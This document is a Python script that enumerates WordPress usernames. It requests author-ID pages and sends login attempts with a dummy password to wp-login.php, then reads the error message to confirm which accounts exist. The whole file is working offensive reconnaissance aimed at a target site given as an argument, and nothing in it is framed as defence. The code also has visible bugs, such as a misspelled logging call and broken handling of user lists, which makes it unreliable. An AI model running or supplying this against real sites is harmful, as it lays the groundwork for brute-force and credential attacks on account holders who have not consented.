#!/usr/bin/python3

import argparse, logging, sys
from bs4 import BeautifulSoup
from requests_html import AsyncHTMLSession
import asyncio

FORMAT = '[%(asctime)s] [%(levelname)-8s] [%(message)s]'
G_USERS = set()
V_USERS = []
        
def output_file(user_list):
    looging.info(f'Crated file: {args.output}')
    if args.output:
        with open(args.output, 'w') as f:
            for user in user_list:
                f.write("%s\n" % user)
        f.close()

async def id_enum(id,s):
    global G_USERS
    try:
        r = await s.get(f'{args.url}/?author={id}')
        if r.status_code == 200:
            soup = BeautifulSoup(r.content, "html.parser")
            name = soup.find("span").get_text()
            body = soup.find('body')
            slug = body.get('class')[2].replace('author-','')
            G_USERS.add(name.lower())
            G_USERS.add(slug.lower())   
            logging.info(f'Find : (ID: {id} ; NAME: {name} ; SLUG: {slug})')
    except Exception as e:
        print(f'User ID Enumeration Failed : {e}')
        exit(-1)

async def login_enum(g_user,s):
    global V_USERS
    data = {
        'log':g_user,
        'pwd':'p@assword',
        'wp-submit':'Login In'
    }
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    try:
        r = await s.post(args.url+'/wp-login.php', headers=headers, data=data, verify=False)
        if 'The password you entered for the username' in r.text:
            V_USERS.append(g_user)
        else:
            logging.info(f"Tryed: {g_user}")
    except Exception as e:
        print(f'Login Enumeration Failed : {e}')
        exit(-1)
    
async def main():
    global G_USERS
    print('\n| Start User Enum Script')
    s = AsyncHTMLSession()

    if not args.skipIdEnum:
        print(f'[#] Enumartion via User ID from 1 to {args.id}')
        tasks = (id_enum(id,s) for id in range(1,args.id))
        await asyncio.gather(*tasks)

    if not args.skipLoginEnum:  
        print(f'[#] Enumartion via Login with {len(G_USERS)} Usernames')
        for listname in username_list:
            if args.userlist:
                users = [line.lower().replace("\n","") for line in open(listname, 'r')]
            else:
                users = listname
            G_USERS.update(users)
        tasks = (login_enum(g_user,s) for g_user in G_USERS)
        await asyncio.gather(*tasks)
   
    if len(V_USERS):
        print(f'| Valide Usernames: {str(V_USERS)}')
        output_file(V_USERS)
    else:
        print('| No Valide Usernames found')
        print(f'| Usernames on the Site: {str(G_USERS)}')
        output_file(G_USERS)
    print('| End')
    exit()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description = 'Username Enumartion Skript, find Usernames via User ID and Login Alert')
    parser.add_argument('--url', required=True, type=str, help='Target WordPress URL')
    parser.add_argument('-u', '--userlist', nargs='*', default=[], help='One or more lists with usernames')
    parser.add_argument('-U', '--user', nargs='+', type=str, help='One or more individual Usernames')
    parser.add_argument('-o', '--output', nargs='?', default=None, const='find_username.lst', help='Output file for valide usernames')
    parser.add_argument('-i', '--id', type=int, default=100, help='Nummbers of User IDs to Brute Force')
    parser.add_argument('-sIE', '--skipIdEnum', action=argparse.BooleanOptionalAction, default=False, help='Skip Enumeration via User ID')
    parser.add_argument('-sLE', '--skipLoginEnum', action=argparse.BooleanOptionalAction, default=False, help='Skip Enumeration via Login Alert')
    parser.add_argument('-log', '--level', default=50, type=int, help='Set Logging Level')
    args = parser.parse_args()
    args.url = args.url.rstrip('/')
    username_list = []
    if args.user:
        username_list = args.user
    elif args.userlist:
        username_list = args.userlist

    logging.basicConfig(stream=sys.stdout, encoding='utf-8', format=FORMAT, level=args.level)
    asyncio.run(main())